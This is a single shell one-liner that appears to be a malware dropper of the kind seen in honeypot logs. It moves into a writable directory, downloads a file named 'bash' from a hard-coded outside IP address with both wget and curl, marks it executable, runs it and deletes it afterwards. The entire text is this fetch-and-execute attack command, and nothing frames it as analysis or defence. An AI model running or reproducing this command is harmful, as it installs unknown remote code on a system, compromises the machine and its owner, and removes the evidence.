cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.199.203.15/bash; curl -O http://139.199.203.15/bash; chmod +x bash; ./bash; rm -rf bash
